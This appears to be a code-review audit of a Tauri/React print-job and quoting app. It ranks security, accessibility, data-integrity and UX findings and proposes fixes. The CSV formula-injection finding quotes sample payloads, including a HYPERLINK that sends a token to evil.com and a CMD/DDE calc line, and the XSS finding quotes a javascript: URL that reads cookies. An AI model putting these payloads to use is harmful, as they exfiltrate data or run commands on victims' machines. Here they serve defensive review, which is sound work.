## CRITICAL findings

### 1. Tauri `fs:scope` mismatch with `save()` dialog

**File:** [src-tauri/capabilities/default.json:12](src-tauri/capabilities/default.json:12)
**Category:** security / tauri
**Confidence:** high

The `fs:scope` allow-list restricts `writeFile` to `$DOWNLOAD/*`, but `generateQuotePdf` calls Tauri's `save()` dialog with no path filter — the user can navigate anywhere and pick a path like `~/Desktop/Quote-Q-0001.pdf`. When `writeFile` is then called against that path, Tauri 2's capability system denies the call (path outside scope), surfacing as the generic "Could not generate quote" error.

**Worst case:** Desktop user picks Desktop or Documents as save location, PDF generation appears to fail with no actionable error message. Re-routing to Downloads works but the user doesn't know that.

**Fix:** Broaden `fs:scope` to `$HOME/**` OR pass a `defaultPath` scoped to `$DOWNLOAD` on the `save()` dialog AND document the restriction in the error message.

### 2. All modals missing `role="dialog"`, `aria-modal="true"`, `aria-labelledby`

**Files:** 7+ — [PrintQuoteModal](src/components/PrintQuoteModal.tsx:300), [SettingsModal](src/components/SettingsModal.tsx:179), [CustomerEditModal](src/components/CustomerEditModal.tsx:101), [DeclineQuoteModal](src/components/DeclineQuoteModal.tsx:78), [UserProfileModal](src/components/UserProfileModal.tsx), [CustomerCsvImportModal](src/components/CustomerCsvImportModal.tsx), [MaintenanceAlertModal](src/components/MaintenanceAlertModal.tsx), plus inline overlays in [JobsManager](src/components/JobsManager.tsx:1776)
**Category:** aria-missing
**WCAG:** 4.1.2 Name, Role, Value (Level A)
**Confidence:** high

Grep for `role="dialog"` returns zero matches across `src/`. Screen readers (NVDA, VoiceOver) read modals as ambient page content with no indication the user is inside an overlay. Most screen readers also do not restrict virtual cursor movement to the modal without `aria-modal="true"`, allowing users to "read behind" the backdrop.

**Fix:** Each modal's inner card needs:
```tsx
role="dialog"
aria-modal="true"
aria-labelledby="modal-title-id"
```
And the `<h3>` header needs a matching `id`. Since every modal already has an `<h3>`, this is a minimal mechanical change. A `Modal` primitive in `src/components/ui/` would bake this in once for all consumers.

### 3. No focus trap and no focus-return in any modal

**Files:** Same 7+ modals as above.
**Category:** focus-trap
**WCAG:** 2.4.3 Focus Order (Level A), ARIA APG modal dialog pattern
**Confidence:** high

No modal moves focus into itself on open or restores focus to the trigger element on close. Keyboard users must tab from their previous focus position through all intervening page elements to reach the modal's first interactive element. On close, focus is lost to `document.body`.

**Fix:** Establish a `<Modal>` primitive that: (a) on mount, focuses the first focusable child, (b) traps focus within the modal via a `Tab`/`Shift+Tab` keydown handler, (c) on unmount, restores focus to the element that was focused before mount. The pattern can crib from `focus-trap-react` or be hand-rolled in ~40 lines.

## HIGH findings

### 4. Non-atomic `addSale` — Sale persists without `copiesSold` bump on crash

**File:** [src/hooks/useDatabase.ts:572](src/hooks/useDatabase.ts:572)
**Category:** data-integrity
**Confidence:** high

The standard `addSale` callback performs two sequential un-transacted Dexie writes: `db.sales.add(sale)` then `db.jobs.put({ ...job, copiesSold: ... })`. If the tab closes or an exception is thrown between them, the Sale row commits permanently while `job.copiesSold` is never bumped. The Convert-to-Sale path correctly wraps both writes in `db.transaction('rw', ...)`. `reconcileCopiesSoldFromSales` heals this on next page load, but a window exists.

**Fix:** Wrap `db.sales.add` and the `job.copiesSold` update in a single `db.transaction('rw', db.sales, db.jobs, ...)` — matches the Convert-to-Sale pattern.

### 5. CSV export does not sanitize formula-injection chars

**File:** [src/utils/csvHelpers.ts:307](src/utils/csvHelpers.ts:307) (`generateExportCsv`)
**Category:** security
**Confidence:** high

Raw asset field values (user-authored `name`, `notes`, `brand`) are passed to PapaParse's `unparse` with no prefix/escape applied to cells starting with `=`, `+`, `-`, or `@`. A user with a maliciously-named asset who exports and shares the CSV could trigger formula execution on the recipient's machine in Excel/LibreOffice.

**Worst case:** `=HYPERLINK("https://evil.com?token="&A1,"Click me")` or `+CMD|' /C calc'!A0` interpreted as a formula on open.

**Fix:** Before passing to PapaParse, escape any string cell whose first character is `=`, `+`, `-`, or `@` with a leading `'` (Excel treats the apostrophe as a literal string prefix). 5-line guard at the cell-serialization boundary.

### 6. `job.modelUrl` rendered as anchor `href` without `javascript:` filtering

**File:** [src/components/JobsManager.tsx:585](src/components/JobsManager.tsx:585)
**Category:** security (stored XSS, self-inflicted scope)
**Confidence:** high

`job.modelUrl` lands directly in `<a href>`. React 18 only blocks `javascript:` URLs in some JSX contexts; this is not a guaranteed protection. A user who enters `javascript:alert(document.cookie)` creates a stored XSS payload that executes whenever they (or another user on a shared machine) clicks the link.

**Fix:** Validate `job.modelUrl` starts with `http://` or `https://` before rendering the anchor; fall back to plain text otherwise. One-line guard at render.

**Files:**
- [src/components/CustomerEditModal.tsx](src/components/CustomerEditModal.tsx) — no test file
- [src/components/CustomerCsvImportModal.tsx](src/components/CustomerCsvImportModal.tsx) — no test file
- [src/components/CustomerLibrary.tsx](src/components/CustomerLibrary.tsx) — no test file

**Category:** missing-tests
**Confidence:** high

**Fix:** Author 3 test files. Priority order: (1) `CustomerEditModal` email-lowercase divergence + validation, (2) `CustomerCsvImportModal` happy path + WR-06, (3) `CustomerLibrary` search filter + delete-confirm.

### 8. `InfoTooltip` uses static `id="info-tooltip-content"` — duplicates when multiple tooltips visible

**File:** [src/components/ui/InfoTooltip.tsx:39](src/components/ui/InfoTooltip.tsx:39)
**Category:** aria-missing
**WCAG:** 4.1.1 Parsing (Level A)
**Confidence:** high

Every `InfoTooltip` renders its tooltip span with the same hard-coded `id`. `SettingsModal` alone renders 6+ visible simultaneously on the Costs & Rates tab. Multiple elements sharing an `id` invalidates `aria-describedby` semantics.

### 9. Virtualized lists lack `role="list"` / `aria-rowcount`

**Files:** [JobsManager:1726](src/components/JobsManager.tsx:1726), [CustomerLibrary:275](src/components/CustomerLibrary.tsx:275), [AssetLibrary:1159](src/components/AssetLibrary.tsx:1159)
**Category:** screen-reader
**WCAG:** 1.3.1 Info and Relationships (Level A)
**Confidence:** high

react-window v2's `<List>` renders a plain `<div>` with no semantic role. Screen-reader users hear an anonymous sequence of `<div>` elements with no list-membership signal or total count.

**Fix:** Add `role="list"` and `aria-rowcount={totalCount}` to each `<List>` container; add `role="listitem"` to each row's outer `<div>`. For `AssetLibrary`'s desktop table path: add `role="table"` or `role="grid"` to the parent to make existing `role="row"` children well-formed.

## MEDIUM findings

### 11. `createQuote` reads stale `nextQuoteNumber` — concurrent sessions can collide

**File:** [src/hooks/useDatabase.ts:841](src/hooks/useDatabase.ts:841)
**Category:** data-integrity
**Confidence:** high

`createQuote` reads `nextQuoteNumber` from a React `userProfile` snapshot captured at call time, then writes back `{...userProfile, nextQuoteNumber: nextNum + 1}` inside a Dexie transaction. Two tabs (or two rapid clicks before the liveQuery re-emits) can both read the same stale number; both Quotes get the same `quoteNumber`. Schema declares `quoteNumber` as indexed but NOT unique — Dexie won't throw.

**Fix:** Inside the transaction, read the authoritative `nextQuoteNumber` from `db.settings.get('userProfile')` rather than the call-time argument. Read-then-increment becomes truly atomic.

### 12. `backfillQuotesFromJobs` hardcodes `'USD'`

**File:** [src/db/backfill.ts:230](src/db/backfill.ts:230)
**Category:** logic-error / UX
**Confidence:** high

The v7→v8 upgrade callback can't access `UserProfile` through normal channels, so backfilled Quote rows get `currency: 'USD'`. A CAD or EUR user with existing `PrintJob.quoteNumber` (pre-v1.2) sees `$12.00 USD` on their old quotes after migration. Scope is narrow (only pre-v1.2 users with `quoteNumber` set) but real.

**Fix:** Inside the upgrade callback, `tx.table('settings').get('userProfile')`, parse JSON, extract `currency`, use that. Comment in the source already documents the trade-off — promote it from "trade-off" to "fix."

### 13. Pending Quote overflow menu has no outside-click/Escape close

**File:** [src/components/JobsManager.tsx:150](src/components/JobsManager.tsx:150) (`QuoteRow`)
**Category:** UX bug
**Confidence:** high

`overflowOpen` local state has no outside-click listener, no Escape handler, no `onBlur`. Once open, the only close paths are clicking a menu item or re-clicking the toggle. Menu occludes other content; users can mis-click "Mark Declined" on the wrong quote.

**Fix:** Add a `useEffect` that registers a `mousedown` listener on `document` while `overflowOpen` is true and closes if click target is outside the menu container. ~10 lines.

### 14. `(doc as any).lastAutoTable.finalY` — unsafe cast in PDF generator

**File:** [src/pdf/generateQuotePdf.ts:161](src/pdf/generateQuotePdf.ts:161)
**Category:** unsafe-cast
**Confidence:** high

Only `as any` in the entire v1.2 diff. Reads `lastAutoTable.finalY` off the jsPDF doc — works because jsPDF-autotable mutates it post-render. If autotable's API changes or the call throws, accesses `undefined.finalY` at runtime.

**Fix:** Module augmentation:
```ts
declare module 'jspdf' {
  interface jsPDF { lastAutoTable: { finalY: number } }
}
```
Cast disappears.

### 15. `customerCsv.test.ts` missing formula-injection and Unicode edge cases

**Category:** weak-edge-cases

### 16. `getBreakEvenInfo` called twice per job

### 18. `useDynamicRowHeight` in `CustomerLibrary` has no `key`

**File:** [src/components/CustomerLibrary.tsx:153](src/components/CustomerLibrary.tsx:153)

### 20. Record Sale and `CustomerEditModal` labels lack `htmlFor`/`id` pairing

**Files:** [JobsManager.tsx:1789](src/components/JobsManager.tsx:1789) (Record Sale), [CustomerEditModal.tsx:133](src/components/CustomerEditModal.tsx:133)

Visible labels like `<label className="block text-xs ...">Quantity</label>` have no `htmlFor`; `<Input>` has no `id`. Screen reader reads label then input as separate unconnected elements.

### 21. `CollapsibleSection`'s `aria-controls` points to non-existent `id` when collapsed

**File:** [src/components/ui/CollapsibleSection.tsx:53](src/components/ui/CollapsibleSection.tsx:53)
**Category:** aria-missing
**WCAG:** 4.1.2 (Level A)

`<button aria-controls={bodyId}>` — but the `<div id={bodyId}>` body is conditionally rendered via `{open && (...)}`. When collapsed, `aria-controls` references an `id` that doesn't exist in the DOM. ARIA spec requires `aria-controls` to reference an existing element.

**Fix:** Always render the body, toggle with `hidden={!open}` or `display: none`. Bonus: smoother animations possible later.

### 22. `QuoteStatusPill` color-only state (text label saves it)

**File:** [src/components/JobsManager.tsx:128](src/components/JobsManager.tsx:128)
**Category:** contrast
**WCAG:** 1.4.1 Use of Color (Level A)

Three states (Pending=amber, Sale=emerald, Declined=slate). Labels ARE present as text so 1.4.1 technically passes. The `text-slate-300` on `bg-slate-700` (Declined pill) is borderline on the 3:1 large-text minimum. The `<span>` has no `role`.

**Fix:** Bump Declined-pill text contrast OR add `aria-label="Status: {state}"` for screen-reader clarity. Low priority — currently compliant.

## LOW findings

### 23. `parsePositiveNumber` accepts `0`

**File:** [src/utils/csvHelpers.ts:386](src/utils/csvHelpers.ts:386)

Returns `null` for `NaN` or `< 0`, but returns `0` for `"0"`. `unitsPerPackage` has a secondary `<= 0` guard; `wattage` and `purchasePrice` for printers do NOT. Printer with `wattage = 0` silently zeros electricity cost.

**Fix:** Make `parsePositiveNumber` return `null` for `num <= 0` (rename to `parseStrictlyPositiveNumber` or add `allowZero?: boolean` param).

### 24. `versionchange` reload mid-transaction

**File:** [src/db/database.ts:133](src/db/database.ts:133)

Synchronous `window.location.reload()` on `versionchange`. If an `rw` transaction is in-flight, it's aborted by the browser. Risk is low (transactions are ms-scale); industry pattern is `await db.close()` first OR show "Please reload" banner.

**Fix:** Wrap in async + `await db.close()`. Acceptable as-is at current scale.

### 25. `getSetting<T>` JSON `as T` assertion

**File:** [src/db/database.ts:142](src/db/database.ts:142)

Pre-existing pattern but all new v1.2 settings reads (`defaultTerms`, `nextQuoteNumber`, `defaultTaxRate`) flow through it. Stored value structurally out of date → silently partial object typed as full interface.

**Fix:** Add Zod (or hand-rolled) runtime validator at this boundary. Not urgent — every call site has `?? default` fallbacks.

### 26. `dbJobsPutSpy` test mock typed as `any`

### 30. `useSales()` called twice in `JobsManager`

### 31. `calculateMarketplaceFee` not `useCallback`-wrapped

## Cross-cutting themes

These themes bundle multiple findings — addressing them at the bundle level is cheaper than 1-by-1 fixes.

### Theme 1: Modal a11y is broken across the board (8 findings)
Findings #2, #3, #8, #10, #19, #20, #21 — all rooted in lack of a shared `Modal` primitive. **Single fix:** build `src/components/ui/Modal.tsx` that bakes in role="dialog" + aria-modal + focus-trap + focus-return + auto-id'd label + Escape handler. Migrate the 7 modals + 3 inline overlays. Closes 2 CRITICAL + 3 HIGH + 3 MEDIUM in one phase.

### Theme 2: JobsManager.tsx is the elephant (5 findings)
Findings #6, #13, #16, #17, #19, #29, #30, #31 — mostly downstream of `JobsManager.tsx` being 2099 lines / 1141-line component body (see [v1.2-TECH-DEBT.md](v1.2-TECH-DEBT.md)). **Single fix:** extract `<RecordSaleModal>`, `<JobCard>` sale-row, and the customer picker hook. Closes #19 (a11y), enables #6 (XSS guard relocation), simplifies #16/#17/#29 (memoization becomes natural after split).

### Theme 3: Customer-UI is entirely untested (1 finding, large scope)
Finding #7 covers 3 components. **Single fix:** author 3 test files in one plan. The email-lowercase divergence is real risk — `CustomerEditModal` saves emails verbatim while `customerCsv.ts` lowercases. Auto-link will silently miss case-mismatched emails added via the modal.

### Theme 4: Data-integrity edge cases (3 findings)
Findings #4, #11, #12 — all Dexie write paths missing atomicity or read-then-write isolation. **Single fix:** audit pass over every callback in `useDatabase.ts` that mutates more than one store — wrap in `db.transaction()` consistently. ~30 min review + 1 hr changes.

### Theme 5: CSV layer needs hardening (2 findings + tech-debt)
Finding #5 (export formula injection) + #15 (test gaps). Also tech-debt: `CustomerCsvImportModal` + `CsvImportModal` boilerplate duplication (see [v1.2-TECH-DEBT.md](v1.2-TECH-DEBT.md)). **Single fix:** add `sanitizeCsvCell()` helper + use across export paths + test cases for `=`/`+`/`-`/`@`/Unicode/long-field.

### Theme 6: Tauri config is permissive in one place, restrictive in another (1 finding)
Finding #1 — `fs:scope = $DOWNLOAD/*` but save dialog is unconstrained. **Single fix:** broaden scope to `$HOME/**` OR pass `defaultPath` to constrain the dialog. ~5 min.
